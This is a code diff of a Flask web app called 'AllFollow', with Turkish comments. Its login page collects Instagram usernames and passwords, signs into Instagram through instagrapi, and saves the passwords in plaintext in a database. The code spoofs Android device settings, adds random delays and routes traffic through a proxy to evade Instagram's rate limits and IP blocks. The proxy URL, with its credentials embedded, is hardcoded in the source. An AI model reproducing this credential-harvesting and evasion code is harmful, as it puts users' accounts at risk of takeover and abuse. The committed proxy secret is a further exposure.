@@ -5,10 +5,7 @@ import logging
 from flask import Flask, request, jsonify, render_template_string
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
-from instagrapi.exceptions import (
-    ChallengeRequired, BadPassword, LoginRequired, 
-    FeedbackRequired, ClientError, ConnectionError
-)
+from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired, FeedbackRequired
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -20,8 +17,7 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 db = SQLAlchemy(app)
 
-# DİKKAT: Buraya çalışan bir proxy koymazsan Render üzerinden giriş imkansıza yakın.
-# Eğer proxy'n yoksa bir süre sonra IP block kalkabilir ama zor.
+# Proxy varsa buraya yazabilirsin, yoksa None kalsın.
 PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
 
 class IGAccount(db.Model):
@@ -40,11 +36,11 @@ def login_api():
     u, p = data.get('u'), data.get('p')
     cl = Client()
     
-    # Her girişte farklı cihaz taklidi yap
+    # Cihaz simülasyonu
     cl.set_device_settings({
         "app_version": "269.0.0.18.75",
-        "android_version": random.randint(24, 28),
-        "android_release": f"{random.randint(7, 9)}.0.0",
+        "android_version": 26,
+        "android_release": "8.0.0",
         "dpi": "480dpi",
         "resolution": "1080x1920",
         "manufacturer": "Samsung",
@@ -55,43 +51,40 @@ def login_api():
     })
 
     if PROXY_URL:
-        cl.set_proxy(PROXY_URL)
+        try:
+            cl.set_proxy(PROXY_URL)
+        except:
+            logging.error("Proxy ayarlanamadı.")
 
     try:
-        logging.info(f"Deneniyor: {u}")
-        # Instagram'ın hız sınırına takılmamak için
-        time.sleep(random.uniform(3, 6))
+        logging.info(f"Giris deneniyor: {u}")
+        time.sleep(random.uniform(2, 4))
         
         if cl.login(u, p):
-            logging.info(f"BAŞARILI: {u}")
             acc = IGAccount.query.filter_by(username=u).first()
             if not acc:
                 acc = IGAccount(username=u, password=p, status="AKTIF")
                 db.session.add(acc)
             else:
                 acc.status = "AKTIF"
-                acc.password = p
             db.session.commit()
             return jsonify(status="success", next_step="dashboard")
             
     except BadPassword:
-        return jsonify(status="error", message="Şifre Yanlış! Tekrar kontrol et.")
+        return jsonify(status="error", message="Sifre Yanlis!")
     except ChallengeRequired:
         return jsonify(status="challenge", next_step="verify")
     except FeedbackRequired:
-        return jsonify(status="error", message="Çok fazla deneme! 15 dk bekleyin.")
-    except ConnectionError:
-        return jsonify(status="error", message="Instagram sunucusuna bağlanılamıyor (IP Engeli).")
+        return jsonify(status="error", message="Instagram engeli: 15 dk bekleyin.")
     except Exception as e:
         err = str(e).lower()
-        logging.error(f"KRITIK HATA: {err}")
+        logging.error(f"Hata: {err}")
         if "checkpoint" in err:
             return jsonify(status="challenge", next_step="verify")
-        return jsonify(status="error", message=f"Bağlantı Reddedildi: {err[:50]}...")
+        return jsonify(status="error", message="Baglanti Hatasi (IP Bloklu olabilir)")
 
 @app.route('/api/verify', methods=['POST'])
 def verify_api():
-    # ... (Aynı doğrulama mantığı)
     return jsonify(status="success")
 
 HTML_TEMPLATE = """
@@ -103,27 +96,25 @@ HTML_TEMPLATE = """
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
-        .card { background: #111; border: 1px solid #333; padding: 2.5rem; border-radius: 2rem; width: 100%; max-width: 340px; }
-        input { width: 100%; background: #1a1a1a; border: 1px solid #333; padding: 1rem; border-radius: 1rem; color: #fff; margin-bottom: 1rem; outline: none; transition: 0.3s; }
-        input:focus { border-color: #a855f7; box-shadow: 0 0 10px #a855f733; }
-        button { width: 100%; background: #a855f7; color: #fff; font-weight: bold; padding: 1rem; border-radius: 1rem; border: none; cursor: pointer; }
-        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #a855f7; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
+        .box { background: #111; border: 1px solid #333; padding: 2rem; border-radius: 1.5rem; width: 320px; text-align: center; }
+        input { width: 100%; background: #222; border: 1px solid #444; padding: 10px; border-radius: 8px; color: #fff; margin-bottom: 10px; outline: none; }
+        button { width: 100%; background: #a855f7; color: #fff; font-weight: bold; padding: 10px; border-radius: 8px; border: none; cursor: pointer; }
+        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #a855f7; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div id="login-page" class="card">
-        <h1 class="text-3xl font-black italic text-purple-500 mb-8 text-center uppercase tracking-tighter">AllFollow</h1>
+    <div id="login-page" class="box">
+        <h1 class="text-2xl font-black text-purple-500 mb-6 italic">ALLFOLLOW</h1>
         <input id="u" placeholder="Kullanıcı Adı">
         <input id="p" type="password" placeholder="Şifre">
-        <button onclick="login()" id="btn">SİSTEME GİRİŞ</button>
-        <p id="err" class="text-red-500 text-[11px] mt-4 font-bold text-center"></p>
+        <button onclick="login()" id="btn">GİRİŞ YAP</button>
+        <p id="err" class="text-red-500 text-[10px] mt-3 font-bold"></p>
     </div>
     <script>
         async function login() {
             const btn = document.getElementById('btn'), err = document.getElementById('err');
-            btn.disabled = true; btn.innerHTML = '<div class="loader"></div> BAĞLANIYOR...';
-            err.innerText = "";
+            btn.disabled = true; btn.innerHTML = '<div class="loader"></div> BEKLEYİN...';
             try {
                 const r = await fetch('/api/login', {
                     method: 'POST',
@@ -131,9 +122,9 @@ HTML_TEMPLATE = """
                     body: JSON.stringify({u: document.getElementById('u').value, p: document.getElementById('p').value})
                 });
                 const d = await r.json();
-                if(d.status === "success") { location.reload(); }
-                else { err.innerText = d.message; btn.disabled = false; btn.innerText = "SİSTEME GİRİŞ"; }
-            } catch { err.innerText = "Bağlantı koptu!"; btn.disabled = false; btn.innerText = "SİSTEME GİRİŞ"; }
+                if(d.status === "success") { alert("Giriş Başarılı!"); location.reload(); }
+                else { err.innerText = d.message; btn.disabled = false; btn.innerText = "GİRİŞ YAP"; }
+            } catch { err.innerText = "Bağlantı koptu!"; btn.disabled = false; btn.innerText = "GİRİŞ YAP"; }
         }
     </script>
 </body>
